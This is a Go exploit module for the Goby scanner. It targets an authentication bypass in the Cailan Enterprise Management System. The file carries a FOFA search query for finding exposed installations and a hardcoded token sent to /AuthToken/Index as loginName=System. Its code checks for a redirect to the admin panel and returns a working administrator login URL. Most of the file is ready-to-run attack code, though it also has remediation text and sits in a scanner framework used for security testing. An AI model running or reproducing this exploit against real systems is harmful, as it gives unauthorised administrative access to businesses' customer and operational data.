package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "The Cailan Enterprise Management System /AuthToken/Index Permission Bypass Vulnerability",
    "Description": "<p>The Cailan Enterprise Management System has a security vulnerability that allows unauthorized attackers to log in through specific methods, gaining access to sensitive data and functions.</p>",
    "Product": "Cailan Enterprise Management System",
    "Homepage": "http://www.cailsoft.cn/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-08-01",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "(body=\"企业管理系统\" && body=\"赛蓝\") || body=\"http://www.cailsoft.com\"",
    "GobyQuery": "(body=\"企业管理系统\" && body=\"赛蓝\") || body=\"http://www.cailsoft.com\"",
    "Level": "1",
    "Impact": "<p>This vulnerability could lead to the leakage of sensitive information, including customer data and business data. Attackers might also alter system settings, causing business disruptions or other security risks.</p>",
    "Recommendation": "<p>It is recommended that users of the Cailan Enterprise Management System update to the latest version immediately to fix the known security vulnerabilities. Additionally, strengthen system monitoring and access control to ensure that only authorized users can access the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "info",
            "show": ""
        },
        {
            "name": "info",
            "type": "input",
            "value": "c94ad0c0aee8b1f23b138484f014131f",
            "show": "mode=info"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AdminPretty",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/AuthToken/Index"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/AuthToken/Index?loginName=System&token={{{info}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AdminPretty",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "ouput|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "HW-2024",
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "赛蓝企业管理系统 /AuthToken/Index 权限绕过漏洞",
            "Product": "赛蓝企业管理系统",
            "Description": "<p>赛蓝企业管理系统权限绕过漏洞可以允许未经授权的攻击者通过特定方式登录系统，获取对敏感数据和敏感功能的访问权限。<br></p>",
            "Recommendation": "<p>关注官方补丁发布信息，打上补丁或者升级到最新版本。同时，加强系统监控和访问控制，确保只有授权用户才能访问系统。<br></p>",
            "Impact": "<p>此漏洞可能导致敏感信息泄露，包括客户数据、业务数据等。攻击者还可能篡改系统设置，造成业务中断或其他安全风险。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "HW-2024",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "The Cailan Enterprise Management System /AuthToken/Index Permission Bypass Vulnerability",
            "Product": "Cailan Enterprise Management System",
            "Description": "<p>The Cailan Enterprise Management System has a security vulnerability that allows unauthorized attackers to log in through specific methods, gaining access to sensitive data and functions.<br></p>",
            "Recommendation": "<p>It is recommended that users of the Cailan Enterprise Management System update to the latest version immediately to fix the known security vulnerabilities. Additionally, strengthen system monitoring and access control to ensure that only authorized users can access the system.<br></p>",
            "Impact": "<p>This vulnerability could lead to the leakage of sensitive information, including customer data and business data. Attackers might also alter system settings, causing business disruptions or other security risks.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "HW-2024",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10982"
}`
	sendInitialPayload_KzRKfL := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := `/AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 302 {
			return nil, errors.New("response status code is not 302")
		}
		if !strings.Contains(resp.Utf8Html, `/Home6/AdminPretty`) {
			return nil, errors.New("not expected response")
		}
		return resp, nil
	}

	sendExploitPayload_OAsDXN := func(hostInfo *httpclient.FixUrl, info string) (*httpclient.HttpResponse, error) {
		uri := `/AuthToken/Index?loginName=System&token=` + info
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			_, err := sendInitialPayload_KzRKfL(hostInfo)
			if err != nil {
				return false
			}

			ss.VulURL = hostInfo.FixedHostInfo + `/AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			info := goutils.B2S(stepLogs.Params["info"])

			resp, err := sendExploitPayload_OAsDXN(expResult.HostInfo, info)
			if err != nil {
				expResult.Output = `漏洞利用失败:` + err.Error()
				expResult.Success = false
				return expResult
			}
			if resp.StatusCode != 302 || !strings.Contains(resp.Utf8Html, `/Home6/AdminPretty`) {
				expResult.Output = `漏洞利用失败: 未找到预期的响应`
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "http://" + expResult.HostInfo.HostInfo + `/AuthToken/Index?loginName=System&token=` + info
			return expResult
		},
	))
}
